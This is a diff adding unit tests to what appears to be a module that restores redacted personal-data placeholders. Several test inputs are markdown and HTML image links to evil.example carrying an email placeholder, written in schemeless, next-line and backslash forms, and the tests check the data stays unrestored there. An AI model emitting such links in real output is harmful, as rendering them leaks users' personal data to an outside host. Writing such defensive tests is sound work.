@@ -115,6 +115,30 @@ describe("no restore inside link addresses (gap G1)", () => {
     expect(m.diagnose(text).blocked.length).toBe(1);
   });
 
+  it.each([
+    ["![x](\n//evil.example/?d=<EMAIL_1>)"],
+    ["![x](\n  https://evil.example/a?q=1 <EMAIL_1>)"],
+    ["![x][r]\n\n[r]: //evil.example/?d=<EMAIL_1>"],
+    ["[r]: /\\evil.example/?<EMAIL_1>"],
+    ['<img src=\n"//evil.example/<EMAIL_1>">'],
+    ["<img src=//evil.example/<EMAIL_1>>"],
+    ["<img src=\\\\evil.example\\<EMAIL_1>>"],
+  ])("keeps a schemeless or next-line address %s", (text) => {
+    const m = map();
+    expect(m.restoreText(text)).toBe(text);
+  });
+
+  it.each([
+    ["// <PERSON_1> is the id"],
+    ["ratio 1//2 and <PERSON_1>"],
+    ["data = <PERSON_1>"],
+    ["![x](https://ok.example/a.png)\n\nName: <PERSON_1>"],
+    ["[docs](https://ok.example/a\n\nName: <PERSON_1>"],
+  ])("restores text that only looks like an address %s", (text) => {
+    const m = map();
+    expect(m.restoreText(text)).toBe(text.replace("<PERSON_1>", "Alice Lee"));
+  });
+
   it("still restores plain text next to links", () => {
     const m = map();
     expect(m.restoreText("see https://docs.example.com for <PERSON_1>")).toBe("see https://docs.example.com for Alice Lee");
